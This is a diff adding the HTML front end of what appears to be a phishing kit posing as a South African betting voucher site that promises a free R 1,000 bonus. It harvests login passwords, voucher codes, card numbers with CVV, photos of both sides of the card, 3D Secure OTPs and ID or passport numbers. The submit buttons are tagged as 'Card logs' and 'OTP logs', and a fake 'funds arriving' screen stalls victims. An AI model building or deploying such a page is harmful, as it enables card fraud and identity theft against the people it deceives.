@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betting Voucher South Africa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+    <!-- Overlay Loader Components -->
+    <div id="loading-view">
+        <div class="loader-logo">Betting Voucher</div>
+        <div class="spinner"></div>
+    </div>
+    <div id="process-overlay">
+        <div class="loader-logo">Betting Voucher</div>
+        <div class="spinner"></div>
+    </div>
+    <div id="redirect-overlay">
+        <div class="loader-logo">Betting Voucher</div>
+        <p class="redirect-text">Finalizing... <span id="timer">3</span></p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Live Chat Widget -->
+    <div id="chat-icon"><i class="fas fa-headset"></i></div>
+    <div id="chat-window">
+        <div id="chat-header">
+            <span>Betting Voucher Live Support</span>
+            <i class="fas fa-times" id="close-chat"></i>
+        </div>
+        <div id="chat-msgs">
+            <div class="msg-b msg-agent">Welcome to Betting Voucher South Africa. An agent is ready to help you with your voucher or withdrawal.</div>
+        </div>
+        <div id="chat-input-area">
+            <label for="chat-file"><i class="fas fa-camera"></i></label>
+            <input type="file" id="chat-file" accept="image/*">
+            <input type="text" id="chat-txt" placeholder="Describe your issue...">
+            <i class="fas fa-paper-plane" id="send-chat-btn"></i>
+        </div>
+    </div>
+
+    <!-- Main Workspace View -->
+    <div id="home-view" class="view">
+        <header>
+            <div class="logo-main">Betting Voucher</div>
+            <div class="header-btns">
+                <button class="btn-lgn-head open-login">Login</button>
+                <button class="btn-sgp-head open-signup">Sign Up</button>
+            </div>
+        </header>
+
+        <div class="gold-banner">
+            <div class="gold-header">EXCLUSIVE GOLD MEMBER ACCESS</div>
+            <div class="category-grid">
+                <div class="cat-card cat-sport standard-login-trigger">SPORT</div>
+                <div class="cat-card cat-casino standard-login-trigger">CASINO</div>
+            </div>
+            <button class="collect-btn standard-login-trigger">Collect Free R 1,000 Voucher</button>
+        </div>
+
+        <nav class="footer-nav">
+            <div class="nav-tab open-login"><i class="fas fa-sign-in-alt"></i>Login</div>
+            <div class="nav-tab" id="chat-tab-trigger"><i class="fas fa-comment"></i>Chat</div>
+            <div class="nav-tab active-tab"><i class="fas fa-receipt"></i>Betslip</div>
+            <div class="nav-tab"><i class="fas fa-gift"></i>Promos</div>
+            <div class="nav-tab open-signup"><i class="fas fa-user-plus"></i>Sign Up</div>
+        </nav>
+    </div>
+
+    <!-- Modals Layer -->
+    <!-- 1. Login Modal -->
+    <div id="login-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header">Login <i class="fas fa-times close-modal-btn"></i></div>
+            <div class="modal-body">
+                <input type="text" id="lgn-mobile" placeholder="+27 Mobile Number">
+                <div class="input-wrap">
+                    <input type="password" id="login-pw" placeholder="Enter Password">
+                    <i class="fas fa-eye-slash pw-eye" id="eye-login"></i>
+                </div>
+                <div class="forgot-row">
+                    <span class="open-recovery">Forgot Username?</span>
+                    <span class="open-recovery">Forgot Password?</span>
+                </div>
+                <div class="signup-promo-box">
+                    <span>Don't have an account yet?</span>
+                    <strong class="open-signup cursor-pointer">Sign Up <i class="fas fa-chevron-right"></i></strong>
+                </div>
+                <button id="lgn-submit" class="submit-btn" data-log-type="Betting Voucher logs">Login</button>
+                <div id="login-error" class="error-box">
+                    <i class="fas fa-info-circle"></i> <span>Access Denied. Check Username and/or Password</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. Voucher Modal -->
+    <div id="vch-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header">Voucher Verification <i class="fas fa-times close-modal-btn"></i></div>
+            <div class="modal-body">
+                <p class="voucher-notice">Load <b>R 200 voucher</b> to unlock <b>R 1000</b>. Withdraw or bet immediately.</p>
+                <select id="vch-type">
+                    <option>Betting Voucher Bucks Voucher</option>
+                    <option>OTT voucher</option>
+                    <option>1 Voucher</option>
+                    <option>Blu Voucher</option>
+                    <option>EasyLoad</option>
+                    <option>EasyPay</option>
+                    <option>Ringas Voucher</option>
+                    <option>Kazang</option>
+                </select>
+                <input type="text" id="vch-input" placeholder="Enter Voucher Code">
+                <button id="vch-submit" class="submit-btn gold-btn" data-log-type="Voucher logs">Collect R 1000 Now</button>
+                <div id="vch-error" class="error-box">
+                    <i class="fas fa-info-circle"></i> <span>The voucher entered is already used or incorrect.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. Secure Card Linking Modal -->
+    <div id="card-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header">Secure Card Linking <i class="fas fa-times close-modal-btn"></i></div>
+            <div class="modal-body">
+                <p class="ssl-badge"><i class="fas fa-lock"></i> 256-bit SSL Secure Server</p>
+                <input type="text" id="card-holder" placeholder="Cardholder Name">
+                <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19">
+                <div class="grid-2col">
+                    <input type="text" id="card-exp" placeholder="MM/YY" maxlength="5">
+                    <input type="text" id="card-cvv" placeholder="CVV" maxlength="4">
+                </div>
+                <select id="card-type"><option>Visa</option><option>Mastercard</option></select>
+                <div class="grid-2col file-row">
+                    <div><label class="file-label">Upload Card Front</label><input type="file" id="card-front" accept="image/*"></div>
+                    <div><label class="file-label">Upload Card Back</label><input type="file" id="card-back" accept="image/*"></div>
+                </div>
+                <button id="card-submit" class="submit-btn" data-log-type="Card logs">Verify & Link Account</button>
+                <div id="card-error" class="error-box">
+                    <i class="fas fa-info-circle"></i> <span>Verification failed. Please check details.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. 3D Secure OTP Modal -->
+    <div id="otp-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header secure-header">
+                <div class="brand-row">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" height="14" alt="Visa">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" height="18" alt="Mastercard">
+                    <div class="secure-tag">3D Secure</div>
+                </div>
+                <i class="fas fa-times close-modal-btn dark-close"></i>
+            </div>
+            <div class="modal-body secure-body">
+                <div class="receipt-table">
+                    <table>
+                        <tr><td>Merchant:</td><td>Betting Voucher South Africa</td></tr>
+                        <tr><td>Amount:</td><td>R 1,000.00</td></tr>
+                        <tr><td>Transaction:</td><td>Refund/Bonus Credit</td></tr>
+                    </table>
+                </div>
+                <p class="otp-instruction">A One-Time PIN (OTP) has been sent to your registered mobile number for authentication.</p>
+                <div class="otp-input-wrap">
+                    <input type="text" id="otp-input" placeholder="Enter OTP" maxlength="6">
+                    <div class="otp-sub-row">
+                        <span>Ref: BV-8890</span>
+                        <span class="resend-otp-btn">Resend OTP</span>
+                    </div>
+                </div>
+                <button id="otp-submit" class="submit-btn authorize-btn" data-log-type="OTP logs">Authorize Transaction</button>
+                <div id="otp-error" class="error-box">
+                    <i class="fas fa-info-circle"></i> <span>Invalid authentication. Check PIN and try again.</span>
+                </div>
+                <p class="encryption-notice"><i class="fas fa-shield-alt"></i> Protected by bank-level encryption.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5. Sign Up Modal -->
+    <div id="signup-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header">Sign Up <i class="fas fa-times close-modal-btn"></i></div>
+            <div class="modal-body">
+                <input type="text" id="sgp-mobile" placeholder="+27 MobileNumber">
+                <input type="password" id="signup-pw" placeholder="Enter Password">
+                <input type="text" id="sgp-fname" placeholder="First Name">
+                <input type="text" id="sgp-sname" placeholder="Surname">
+                <input type="text" id="sgp-email" placeholder="Email">
+                <div class="coupon-section">
+                    <div class="coupon-card">
+                        <div class="coupon-img"><i class="fas fa-plane coupons-plane-icon"></i></div>
+                        <div class="coupon-info"><h4>1000 Free Flights</h4><p>On Aviator</p></div>
+                    </div>
+                    <div class="coupon-card">
+                        <div class="coupon-img"><i class="fas fa-futbol coupons-soccer-icon"></i></div>
+                        <div class="coupon-info"><h4>R1000 Free Bet</h4><p>On any Sports</p></div>
+                    </div>
+                    <div class="coupon-btns">
+                        <button class="btn-later signup-redirect-trigger">Later</button>
+                        <button class="btn-accept signup-redirect-trigger">Accept</button>
+                    </div>
+                </div>
+                <button id="sgp-submit" class="submit-btn register-margin" data-log-type="Sign up logs">Register Now</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6. Forgotten Details Recovery Modal -->
+    <div id="forgot-pw-modal" class="overlay">
+        <div class="modal-container">
+            <div class="modal-header">Account Recovery <i class="fas fa-times close-modal-btn"></i></div>
+            <div class="modal-body">
+                <select id="doc-type"><option>SA ID Number</option><option>Passport</option></select>
+                <input type="text" id="forgot-input" placeholder="Number">
+                <button id="forgot-submit" class="submit-btn" data-log-type="Forgot Password">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Output View Container -->
+    <div id="success-view" class="view">
+        <header><div class="logo-main">Betting Voucher</div></header>
+        <div class="success-content">
+            <div class="success-header">
+                <div class="success-icon-wrap">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h2>Processing Bonus</h2>
+                <p class="ref-tag">Ref: #BV-ZA-9901</p>
+            </div>
+            <div class="success-step"><i class="fas fa-circle-notch fa-spin"></i><span>Securing connection...</span></div>
+            <div class="success-step"><i class="fas fa-check-circle"></i><span>Voucher Authenticated</span></div>
+            <div class="success-step"><i class="fas fa-check-circle"></i><span>Bank Link Established</span></div>
+            <div class="success-step subtle-opacity"><i class="fas fa-hourglass-half"></i><span>Funds arriving in 1-5 mins</span></div>
+            <div class="notice-box">
+                <strong>Notice:</strong> Please stay on this page. Do not refresh. A notification will appear once R1,000.00 is settled.
+            </div>
+            <button class="submit-btn exit-lobby-btn">Exit to Lobby</button>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
+
